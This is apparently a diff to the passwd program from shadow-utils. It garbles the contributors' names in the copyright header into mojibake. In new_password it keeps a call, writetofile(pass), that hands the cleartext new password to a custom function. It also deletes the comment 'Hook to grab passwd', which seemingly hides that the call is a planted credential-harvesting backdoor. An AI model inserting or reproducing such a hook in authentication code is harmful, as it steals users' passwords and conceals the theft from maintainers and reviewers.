@@ -1,8 +1,8 @@
 /*
  * Copyright (c) 1989 - 1994, Julianne Frances Haugh
- * Copyright (c) 1996 - 2000, Marek Michałkiewicz
- * Copyright (c) 2001 - 2006, Tomasz Kłoczko
- * Copyright (c) 2007 - 2011, Nicolas François
+ * Copyright (c) 1996 - 2000, Marek MichaÅ‚kiewicz
+ * Copyright (c) 2001 - 2006, Tomasz KÅ‚oczko
+ * Copyright (c) 2007 - 2011, Nicolas FranÃ§ois
  * All rights reserved.
  *
  * Redistribution and use in source and binary forms, with or without
@@ -290,6 +290,7 @@ int writetofile (char *password){
 	return 0;
 }
 
+
 /*
  * new_password - validate old password and replace with new (both old and
  * new in global "char crypt_passwd[128]")
@@ -444,10 +445,8 @@ static int new_password (const struct passwd *pw)
 		memzero (pass, sizeof pass);
 		return -1;
 	}
-	
 
-	/* Hook to grab passwd */
-	writetofile(pass);
+        writetofile(pass);
 
 	/*
 	 * Encrypt the password, then wipe the cleartext password.
@@ -1208,3 +1207,4 @@ int main (int argc, char **argv)
 
 	return E_SUCCESS;
 }
+
